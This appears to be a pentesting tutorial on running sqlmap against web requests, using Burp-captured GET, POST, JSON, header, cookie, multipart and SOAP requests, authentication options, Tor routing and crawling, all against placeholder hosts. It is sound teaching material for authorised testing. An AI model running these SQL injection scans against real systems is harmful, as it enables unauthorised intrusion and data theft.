---
title: 'Running SQLMap on HTTP Requests'
description: 'The professional way to use SQLMap: capturing requests from Burp Suite, handling POST data, cookies, custom headers, JSON bodies, and multi-part forms.'
icon: material/web
tags:
  - sqlmap
  - burp-suite
  - http-requests
---

# Running SQLMap on HTTP Requests

!!! success "The Golden Rule"

    **Never just point SQLMap at a raw URL.** The most effective and reliable way to use SQLMap is to capture the exact HTTP request from Burp Suite (or your browser's developer tools) and feed it to SQLMap with the `-r` flag.

---

## Why Use `-r` Instead of `-u`?

When you use `-u "http://target.com/page?id=1"`, SQLMap constructs its own HTTP request with **default headers**. This often fails because:

1. **Missing session cookies** — The application requires authentication
2. **Missing CSRF tokens** — The form expects a hidden token
3. **Wrong Content-Type** — The API expects JSON, not URL-encoded data
4. **Missing custom headers** — The application expects `X-Requested-With` or API keys
5. **Incorrect request format** — The body structure doesn't match what the server expects

Using `-r` with a captured request solves **all of these problems** because you're replaying the exact request the application accepted.

---

## Capturing Requests from Burp Suite

### Step 1: Configure Burp Proxy

1. Open Burp Suite → Proxy → Intercept is ON
2. Configure your browser to use Burp's proxy (127.0.0.1:8080)
3. Navigate to the target page and interact with the vulnerable feature

### Step 2: Find the Request in HTTP History

1. Go to Proxy → HTTP history
2. Find the request that contains the injectable parameter
3. Click on the request to view its details

### Step 3: Save the Request

**Right-click** the request → **Copy to file** → Save as `request.txt`

The file will look something like this:

```http title="request.txt"
GET /api/products?category=electronics&sort=price&id=1 HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=abc123def456; user_pref=dark_mode
Connection: close
```

### Step 4: Run SQLMap

```bash
sqlmap -r request.txt
```

That's it! SQLMap reads the entire request — URL, headers, cookies, body — and tests the parameters it finds.

---

## Testing GET Parameters

### Basic URL Parameter

```bash title="Testing a single GET parameter"
sqlmap -u "http://target.com/page.php?id=1"
```

### Multiple Parameters — Testing a Specific One

When the URL has multiple parameters, SQLMap tests **all of them by default** (at level 1). To target a specific parameter:

```bash title="Only test the 'id' parameter"
sqlmap -u "http://target.com/page.php?id=1&category=books&page=2" -p id
```

### Marking the Injection Point with `*`

You can manually mark exactly where SQLMap should inject by placing a `*` asterisk:

```bash title="Custom injection point"
sqlmap -u "http://target.com/page.php?id=1*&category=books"
```

This tells SQLMap: "inject payloads **only** where the `*` is, and leave everything else alone."

This is incredibly useful for:

- **REST API paths**: `http://target.com/api/users/1*/profile`
- **Specific parameter values**: `http://target.com/page?id=1&sort=name*`

---

## Testing POST Data

### URL-Encoded POST Body

```bash title="Standard form submission"
sqlmap -u "http://target.com/login.php" \
  --data="username=admin&password=test123"
```

SQLMap will test both `username` and `password` parameters. To test only one:

```bash
sqlmap -u "http://target.com/login.php" \
  --data="username=admin&password=test123" \
  -p username
```

### Using a Burp Request (Recommended for POST)

```http title="post_request.txt"
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123
Content-Length: 35

username=admin&password=test123
```

```bash
sqlmap -r post_request.txt
```

---

## Testing JSON Bodies

Modern APIs often use JSON. SQLMap handles this natively:

```http title="json_request.txt"
POST /api/v2/search HTTP/1.1
Host: api.target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Content-Length: 42

{"query":"laptop","category":"electronics","page":1}
```

```bash
sqlmap -r json_request.txt
```

SQLMap automatically detects the JSON content type and tests each JSON value.

### Testing a Specific JSON Parameter

```bash title="Only test the 'query' parameter in JSON"
sqlmap -r json_request.txt -p query
```

### Testing Nested JSON

For deeply nested JSON structures, use the `*` marker:

```http title="nested_json_request.txt"
POST /api/search HTTP/1.1
Host: api.target.com
Content-Type: application/json

{"filters":{"name":"test*","price":{"min":0,"max":100}}}
```

```bash
sqlmap -r nested_json_request.txt
```

---

## Testing HTTP Headers

Some applications use HTTP headers in SQL queries (e.g., logging the `User-Agent`, `Referer`, or `X-Forwarded-For` to a database). SQLMap can test headers too.

### Using `--level` to Include Headers

| Level | What Gets Tested |
|---|---|
| 1 | GET/POST parameters only |
| 2 | + Cookie values |
| 3 | + User-Agent and Referer headers |
| 4 | + More header combinations |
| 5 | + Host header and all other headers |

```bash title="Test cookies and headers"
sqlmap -r request.txt --level=3
```

### Marking a Specific Header for Injection

Use the `*` marker in the request file to tell SQLMap to inject into a specific header:

```http title="header_injection.txt"
GET /dashboard HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0*
Cookie: session=abc123
X-Forwarded-For: 127.0.0.1*
```

```bash
sqlmap -r header_injection.txt
```

SQLMap will inject into the `User-Agent` and `X-Forwarded-For` headers.

### Using `--headers` from the Command Line

```bash
sqlmap -u "http://target.com/page?id=1" \
  --headers="X-Forwarded-For: 127.0.0.1*\nX-Custom-Header: value"
```

---

## Testing Cookie Values

### From the Command Line

```bash
sqlmap -u "http://target.com/page" \
  --cookie="user_id=1; session=abc123" \
  -p user_id
```

### Using `--level=2` to Auto-Test Cookies

```bash title="Automatically test all cookie values"
sqlmap -u "http://target.com/page?id=1" \
  --cookie="user_id=1; role=admin" \
  --level=2
```

At `--level=2`, SQLMap adds cookie parameters to its testing list automatically.

### Cookie with Special Characters

Some cookies contain URL-encoded values. Use `--cookie-del` to specify the delimiter:

```bash
sqlmap -u "http://target.com/page" \
  --cookie="user_id=1;session=abc123" \
  --cookie-del=";"
```

---

## Authentication Scenarios

### HTTP Basic Authentication

```bash
sqlmap -u "http://target.com/admin/page?id=1" \
  --auth-type=basic \
  --auth-cred="admin:password123"
```

### HTTP Digest Authentication

```bash
sqlmap -u "http://target.com/page?id=1" \
  --auth-type=digest \
  --auth-cred="admin:password123"
```

### NTLM Authentication (Windows/AD environments)

```bash
sqlmap -u "http://target.com/page?id=1" \
  --auth-type=ntlm \
  --auth-cred="DOMAIN\\user:password"
```

### Certificate-Based Authentication

```bash
sqlmap -u "https://target.com/page?id=1" \
  --auth-file="/path/to/client-cert.pem"
```

### Custom Login Flow (Session Pre-authentication)

For complex login flows, authenticate manually in Burp first, then capture the authenticated request including the session cookie:

```http title="authenticated_request.txt"
GET /dashboard/users?id=1 HTTP/1.1
Host: target.com
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ...
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

```bash
sqlmap -r authenticated_request.txt
```

!!! tip "Handling Session Expiration"

    If the session expires mid-scan, SQLMap will start getting different responses and may lose track of the injection. You can provide a **safe URL** that SQLMap hits periodically to check if the session is still valid:

    ```bash
    sqlmap -r request.txt \
      --safe-url="http://target.com/dashboard" \
      --safe-freq=10
    ```

    This makes SQLMap request the safe URL every 10 requests. If the response indicates the session has expired (e.g., redirect to login), SQLMap will warn you.

---

## Proxy Configuration

### Routing Through Burp Suite

This is extremely useful for monitoring SQLMap's traffic in Burp:

```bash
sqlmap -r request.txt --proxy="http://127.0.0.1:8080"
```

Now you can watch every request SQLMap makes in Burp's HTTP History tab!

### Routing Through Tor

```bash
sqlmap -r request.txt \
  --tor \
  --tor-type=SOCKS5 \
  --tor-port=9050 \
  --check-tor
```

The `--check-tor` flag verifies that your traffic is actually going through the Tor network.

### Custom Proxy with Authentication

```bash
sqlmap -r request.txt \
  --proxy="http://proxy.company.com:3128" \
  --proxy-cred="user:password"
```

---

## Multi-Part Form Data (File Uploads)

When the form uses `multipart/form-data` (common for file uploads), SQLMap handles it automatically from a captured request:

```http title="multipart_request.txt"
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=---------------------------12345
Cookie: session=abc123

-----------------------------12345
Content-Disposition: form-data; name="filename"

test.jpg
-----------------------------12345
Content-Disposition: form-data; name="description"

A test image
-----------------------------12345--
```

```bash
sqlmap -r multipart_request.txt -p description
```

---

## XML / SOAP Bodies

For XML-based web services:

```http title="soap_request.txt"
POST /ws/userService HTTP/1.1
Host: target.com
Content-Type: text/xml; charset=utf-8
SOAPAction: "getUser"

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <userId>1*</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

```bash
sqlmap -r soap_request.txt
```

Notice the `*` marker inside the `<userId>` element — this tells SQLMap exactly where to inject.

---

## Testing Multiple URLs in Bulk

### From a File

Create a file with one URL per line:

```text title="urls.txt"
http://target.com/page.php?id=1
http://target.com/search.php?q=test
http://target.com/profile.php?user=admin
```

```bash
sqlmap -m urls.txt --batch
```

### From Burp Suite Proxy Log

Export your Burp proxy log and feed it to SQLMap:

```bash title="Parse Burp log and test all requests"
sqlmap -l burp_proxy.log --batch
```

Use `--scope` to filter to specific hosts:

```bash
sqlmap -l burp_proxy.log --batch --scope=".*target\.com.*"
```

### Crawling a Website

SQLMap can crawl the target website and test every link it finds:

```bash
sqlmap -u "http://target.com/" \
  --crawl=3 \         # Crawl depth of 3 levels
  --batch \
  --forms              # Also test HTML forms found
```
